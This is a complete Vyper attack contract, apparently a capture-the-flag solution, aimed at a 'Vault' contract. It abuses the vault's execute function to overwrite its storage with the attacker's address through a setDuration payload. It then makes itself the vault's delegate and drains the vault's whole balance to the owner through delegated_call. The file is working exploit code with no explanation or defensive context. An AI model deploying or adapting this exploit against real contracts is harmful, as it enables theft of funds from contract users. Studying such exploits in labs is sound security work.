# @version ^0.3.7

interface IVault:
    def execute(
        _target: address,
        payload: Bytes[36],
    ) -> Bytes[32]: nonpayable
    def upgradeDelegate(addr: address): nonpayable

owner: immutable(address)

vault: address

@external
@payable
def __init__(_vault: address):
    owner = tx.origin
    self.vault = _vault

@external
def attack():
    assert tx.origin == owner, "!owner"
    payload_1: Bytes[36] = _abi_encode(
        convert(self, uint256),
        method_id=method_id("setDuration(uint256)"),
    )
    payload_2: Bytes[36] = _abi_encode(
        owner,
        method_id=method_id("delegated_call(address)"),
    )
    IVault(self.vault).execute(self.vault, payload_1)
    IVault(self.vault).upgradeDelegate(self)
    raw_call(self.vault, payload_2)

@external
def delegated_call(receiver: address):
    assert msg.sender == self.vault, "!vault"
    raw_call(receiver, b"", value=self.balance)
